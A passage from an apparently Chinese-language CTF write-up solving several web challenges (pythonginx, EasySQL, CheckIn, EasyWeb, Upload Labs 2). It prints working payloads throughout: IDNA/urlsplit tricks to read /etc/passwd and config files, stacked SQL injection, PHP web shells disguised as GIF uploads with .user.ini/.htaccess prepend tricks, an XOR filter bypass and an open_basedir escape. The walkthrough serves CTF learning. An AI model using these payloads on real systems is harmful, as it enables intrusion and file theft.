class="line">    host &#x3D; parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br></pre></td></tr></table></figure>

<p><em>parse.urlparse()函数：将URL解析为六个组件，返回一个6个元素的元组，对应URL的一般结构：<code>scheme://netloc/path;parameters?query#fragment</code></em></p>
<p>大致意思就是第一二次判断时netloc不是 suctf.cc，第三次要是suctf.cc,就返回url的网页源码</p>
<p>题目标题是pythonginx，提示nginx，nginx文件路径如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">配置文件存放目录：&#x2F;etc&#x2F;nginx</span><br><span class="line">主配置文件：&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line">管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</span><br><span class="line">模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</span><br><span class="line">应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</span><br><span class="line">程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br><span class="line">日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</span><br><span class="line">网站配置文件：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>



<p><strong>非预期解</strong></p>
<p>以下是urlsplit函数源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">urlunsplit</span><span class="params">(components)</span>:</span></span><br><span class="line">    scheme, netloc, url, query, fragment, _coerce_result = (</span><br><span class="line">                                          _coerce_args(*components))</span><br><span class="line">    <span class="keyword">if</span> netloc <span class="keyword">or</span> (scheme <span class="keyword">and</span> scheme <span class="keyword">in</span> uses_netloc <span class="keyword">and</span> url[:<span class="number">2</span>] != <span class="string">'//'</span>):</span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">and</span> url[:<span class="number">1</span>] != <span class="string">'/'</span>: url = <span class="string">'/'</span> + url</span><br><span class="line">        url = <span class="string">'//'</span> + (netloc <span class="keyword">or</span> <span class="string">''</span>) + url</span><br><span class="line">    <span class="keyword">if</span> scheme:</span><br><span class="line">        url = scheme + <span class="string">':'</span> + url</span><br><span class="line">    <span class="keyword">if</span> query:</span><br><span class="line">        url = url + <span class="string">'?'</span> + query</span><br><span class="line">    <span class="keyword">if</span> fragment:</span><br><span class="line">        url = url + <span class="string">'#'</span> + fragment</span><br><span class="line">    <span class="keyword">return</span> _coerce_result(url)</span><br></pre></td></tr></table></figure>

<p>这个函数的作用就是如果截取的URL（也就是path的位置）包含//就不再处理path。</p>
<p>也就是<code>scheme:////netloc/path;parameters?query#fragment</code>经过urlsplite处理后会变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scheme&#x3D;&#39;scheme&#39;, netloc&#x3D;&#39;&#39;, path&#x3D;&#39;&#x2F;&#x2F;netloc&#x2F;path;parameters&#39;, query&#x3D;&#39;query&#39;, fragment&#x3D;&#39;fragment&#39;</span><br></pre></td></tr></table></figure>

<p>再经过urlunsplit处理后会变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scheme:&#x2F;&#x2F;netloc&#x2F;path;parameters?query#fragment</span><br></pre></td></tr></table></figure>

<p>如果传入的url是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>会返回主机的用户记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root:*:17647:0:99999:7:::</span><br><span class="line">daemon:*:17647:0:99999:7:::</span><br><span class="line">bin:*:17647:0:99999:7:::</span><br><span class="line">sys:*:17647:0:99999:7:::</span><br><span class="line">sync:*:17647:0:99999:7:::</span><br><span class="line">games:*:17647:0:99999:7:::</span><br><span class="line">man:*:17647:0:99999:7:::</span><br><span class="line">lp:*:17647:0:99999:7:::</span><br><span class="line">mail:*:17647:0:99999:7:::</span><br><span class="line">news:*:17647:0:99999:7:::</span><br><span class="line">uucp:*:17647:0:99999:7:::</span><br><span class="line">proxy:*:17647:0:99999:7:::</span><br><span class="line">www-data:*:17647:0:99999:7:::</span><br><span class="line">backup:*:17647:0:99999:7:::</span><br><span class="line">list:*:17647:0:99999:7:::</span><br><span class="line">irc:*:17647:0:99999:7:::</span><br><span class="line">gnats:*:17647:0:99999:7:::</span><br><span class="line">nobody:*:17647:0:99999:7:::</span><br><span class="line">_apt:*:17647:0:99999:7:::</span><br><span class="line">nginx:!:17708:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>查看配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>

<p><img src="../pic/66" alt=""></p>
<p>查看网站配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        try_files $uri @app;</span><br><span class="line">    &#125;</span><br><span class="line">    location @app &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    location &#x2F;static &#123;</span><br><span class="line">        alias &#x2F;app&#x2F;static;</span><br><span class="line">    &#125;</span><br><span class="line">    # location &#x2F;flag &#123;</span><br><span class="line">    #     alias &#x2F;usr&#x2F;fffffflag;</span><br><span class="line">    # &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示flag再 /usr/fffffflag 中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;b692ca82-8292-4582-846a-286b3743f697&#125;</span><br></pre></td></tr></table></figure>



<p><strong>预期解</strong><br>black hat 上的所展示的部分字符<br><img src="../pic/69.png" alt=""></p>
<p>Altman师傅写的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># coding:utf-8 </span><br><span class="line">for i in range(128,65537):    </span><br><span class="line">    tmp&#x3D;chr(i)    </span><br><span class="line">    try:        </span><br><span class="line">        res &#x3D; tmp.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)        </span><br><span class="line">        if(&quot;-&quot;) in res:            </span><br><span class="line">            continue        </span><br><span class="line">        print(&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;.format(tmp, res, i))    </span><br><span class="line">    except:        </span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>


<p>可以使用<strong>U+2102，ℂ</strong>代替c，或者<strong>U+2106, ℆</strong>代替c/u</p>
<p>读取网站配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.ℂℂ&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">或者</span><br><span class="line">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.c℆usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>

<p>读取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.cℂ&#x2F;usr&#x2F;fffffflag</span><br><span class="line">或者</span><br><span class="line">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.c℆usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure>



<h2 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h2><p>拿到题目是一个输入框，post类型提交</p>
<p>先fuzz一遍，以下关键字被过滤</p>
<p><img src="../pic/68.png" alt=""></p>
<p><strong>非预期解</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; flag&#123;36c7b843-6efb-409d-a1fe-3ef54fce7d6d&#125; [1] &#x3D;&gt; 1 )</span><br></pre></td></tr></table></figure>



<p><strong>预期解</strong></p>
<p>根据测试发现输入长度最大为40个字符</p>
<p>还发现存在堆叠注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;show databases;#</span><br><span class="line"> </span><br><span class="line">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; ctf ) Array ( [0] &#x3D;&gt; ctftraining ) Array ( [0] &#x3D;&gt; information_schema ) Array ( [0] &#x3D;&gt; mysql ) Array ( [0] &#x3D;&gt; performance_schema ) Array ( [0] &#x3D;&gt; test )</span><br></pre></td></tr></table></figure>

<p>经过测试查询语句应该类似于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select $_POST[&#39;query&#39;] || flag ...</span><br></pre></td></tr></table></figure>

<p>关于<a href="https://mariadb.com/kb/en/sql-mode/" target="_blank" rel="noopener">sql_mod</a></p>
<p>当设置sql_mode=<strong>PIPES_AS_CONCAT</strong>时，将”||”视为字符串的连接操作符而非或运算符，这和 Oracle 数据库是一样的，也和字符串的拼接函数 Concat 相类似</p>
<p>所以payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>

<p>返结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; 1flag&#123;36c7b843-6efb-409d-a1fe-3ef54fce7d6d&#125; )</span><br></pre></td></tr></table></figure>



<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>先直接上传图片马，提示文件内容包含<code>&lt;?</code>，采用js的写法绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; </span><br><span class="line">eval($_POST[cmd]);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>改后缀为PHP、PHP2、PHP3、PHP4、PHP5、Phtml，发现都被过滤</p>
<p>php有一个文件是<a href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">.user.ini</a>    <a href="[https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html)">参考连接</a></p>
<p><img src="../pic/70" alt=""></p>
<p>先上传一个图片马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;1.gif&quot;</span><br><span class="line">Content-Type: image&#x2F;gif</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; </span><br><span class="line">eval($_POST[cmd]);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>上传.htaccess发现没有生效，然后上传.user.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;1.gif&quot;</span><br><span class="line">Content-Type: image&#x2F;gif</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;1.gif</span><br></pre></td></tr></table></figure>

<p>auto_prepend_file=1.gif  相当于文件夹下所有文件都包含1.gif</p>
<p>返回信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Upload Labs&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Upload Labs&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;fileUpload&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;upload&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">Your dir uploads&#x2F;2c67ca1eaeadbdc1868d67003072b481 &lt;br&gt;Your files : &lt;br&gt;array(5) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;..&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;.user.ini&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;1.gif&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;index.php&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用蚁剑连接<code>host/uploads/2c67ca1eaeadbdc1868d67003072b481/index.php</code>即可</p>
<p><img src="../pic/71.png" alt=""></p>
<h2 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h2><p>打开题目就是源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh &#x3D; @$_GET[&#39;_&#39;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&#39;One inch long, one inch strong!&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&#39;&#x2F;[\x00- 0-9A-Za-z\&#39;&quot;\&#96;~_&amp;.,|&#x3D;[\x7F]+&#x2F;i&#39;, $hhh) )</span><br><span class="line">    die(&#39;Try something else!&#39;);</span><br><span class="line"></span><br><span class="line">$character_type &#x3D; count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>首先要绕过长度，然后是绕过正则。</p>
<p>绕过长度可以新建一个变量，可以使用异或或者非运算绕过。（~操作要比异或简单，但是被禁用，可以使用异或运算模拟非运算）</p>
<p>异或构造$<em>GET[‘\</em>‘]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo urlencode(urldecode(&quot;%ff%ff%ff%ff&quot;)^&quot;_GET&quot;); &#x2F;&#x2F;%A0%B8%BA%AB</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?_&#x3D;$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure>

<p>查看phpinfo禁用了如下函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</span><br></pre></td></tr></table></figure>

<p>还设置了<code>open_basedir</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open_basedir	&#x2F;var&#x2F;www&#x2F;html&#x2F;:&#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function get_the_flag()&#123;</span><br><span class="line">    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>strrpos(要被检查的字符串,要搜索的字符串) :返回文件最后出现的位置</p>
<p>mb_strpos(要被检查的字符串,要搜索的字符串)：返回要查找的字符串在别一个字符串中首次出现的位置</p>
<p>此函数大致意思是文件内容不能包含&lt;?，上传的文件要经过exif_imagetype（）检测</p>
<p>使用payload上传文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?_&#x3D;$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag</span><br></pre></td></tr></table></figure>

<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define height 12</span><br><span class="line">#define width 12</span><br><span class="line">AddType application&#x2F;x-httpd-php .cc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;1.cc&quot;</span><br></pre></td></tr></table></figure>

<p>1.cc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a00PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>GIF89a与后面加密过的一句话不能使用空格或者回车隔开,因为base64解密文件时会出错，00可以修改为base64中允许出现的任意两个字符，此服务器版本为7.0+无法使用JS写法绕过&lt;?</p>
<p><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544487.html" target="_blank" rel="noopener">绕过open_basedir参考文章</a></p>
<p>绕过payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));&#96;</span><br></pre></td></tr></table></figure>



<p>先扫描目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;upload&#x2F;tmp_2c67ca1eaeadbdc1868d67003072b481&#x2F;1.cc</span><br></pre></td></tr></table></figure>

<p>post内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure>

<p>返回内容</p>
<p><img src="../pic/72.png" alt=""></p>
<p>找到flag，读取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(file(&#39;&#x2F;THis_Is_tHe_F14g&#39;));</span><br></pre></td></tr></table></figure>

<p><img src="../pic/73.png" alt=""></p>
<h2 id="Upload-Labs-2"><a href="#Upload-Labs-2" class="headerlink" title="Upload Labs 2"></a>Upload Labs 2</h2><p>给出了源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;admin.php</span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;;</span><br><span class="line"></span><br><span class="line">class Ad&#123;</span><br><span class="line"></span><br><span class="line">    public $cmd;</span><br><span class="line"></span><br><span class="line">    public $clazz;</span><br><span class="line">    public $func1;</span><br><span class="line">    public $func2;</span><br><span class="line">    public $func3;</span><br><span class="line">    public $instance;</span><br><span class="line">    public $arg1;</span><br><span class="line">    public $arg2;</span><br><span class="line">    public $arg3;</span><br><span class="line"></span><br><span class="line">    function __construct($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)&#123;  &#x2F;&#x2F;构造类时调用的方法</span><br><span class="line"></span><br><span class="line">        $this-&gt;cmd &#x3D; $cmd;</span><br><span class="line"></span><br><span class="line">        $this-&gt;clazz &#x3D; $clazz;</span><br><span class="line">        $this-&gt;func1 &#x3D; $func1;</span><br><span class="line">        $this-&gt;func2 &#x3D; $func2;</span><br><span class="line">        $this-&gt;func3 &#x3D; $func3;</span><br><span class="line">        $this-&gt;arg1 &#x3D; $arg1;</span><br><span class="line">        $this-&gt;arg2 &#x3D; $arg2;</span><br><span class="line">        $this-&gt;arg3 &#x3D; $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check()&#123;</span><br><span class="line"></span><br><span class="line">        $reflect &#x3D; new ReflectionClass($this-&gt;clazz);</span><br><span class="line">        $this-&gt;instance &#x3D; $reflect-&gt;newInstanceArgs();  &#x2F;&#x2F;实例化clazz类</span><br><span class="line"></span><br><span class="line">        $reflectionMethod &#x3D; new ReflectionMethod($this-&gt;clazz, $this-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1); &#x2F;&#x2F;执行clazz中的func1方法，参数为arg1</span><br><span class="line"></span><br><span class="line">        $reflectionMethod &#x3D; new ReflectionMethod($this-&gt;clazz, $this-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2);&#x2F;&#x2F;执行clazz中的func2方法，参数为arg2</span><br><span class="line"></span><br><span class="line">        $reflectionMethod &#x3D; new ReflectionMethod($this-&gt;clazz, $this-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3);</span><br><span class="line">    &#125; &#x2F;&#x2F;执行clazz中的func3方法，参数为arg3</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;  &#x2F;&#x2F;析构类调用的方法</span><br><span class="line">        system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &#39;127.0.0.1&#39;)&#123;</span><br><span class="line">    if(isset($_POST[&#39;admin&#39;]))&#123;</span><br><span class="line">        $cmd &#x3D; $_POST[&#39;cmd&#39;];</span><br><span class="line"></span><br><span class="line">        $clazz &#x3D; $_POST[&#39;clazz&#39;];</span><br><span class="line">        $func1 &#x3D; $_POST[&#39;func1&#39;];</span><br><span class="line">        $func2 &#x3D; $_POST[&#39;func2&#39;];</span><br><span class="line">        $func3 &#x3D; $_POST[&#39;func3&#39;];</span><br><span class="line">        $arg1 &#x3D; $_POST[&#39;arg1&#39;];</span><br><span class="line">        $arg2 &#x3D; $_POST[&#39;arg2&#39;];</span><br><span class="line">        $arg2 &#x3D; $_POST[&#39;arg3&#39;];</span><br><span class="line">        $admin &#x3D; new Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;You r not admin!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.jianshu.com/p/d02cbde1cdd7" target="_blank" rel="noopener">关于PHP反射类</a></p>
<p>大致意思就是要构造ssrf进行命令执行。SoapClient可以构造http请求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; func.php</span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;class.php&#39;;</span><br><span class="line">if (isset($_POST[&quot;submit&quot;]) &amp;&amp; isset($_POST[&quot;url&quot;])) &#123;</span><br><span class="line">    if(preg_match(&#39;&#x2F;^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*&#x2F;i&#39;,$_POST[&#39;url&#39;]))&#123;  </span><br><span class="line">        die(&quot;Go away!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $file_path &#x3D; $_POST[&#39;url&#39;];</span><br><span class="line">        $file &#x3D; new File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        echo &quot;&lt;p&gt;Your file type is &#39;$file&#39; &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>传入的url要经过正则匹配，调用file类</p>
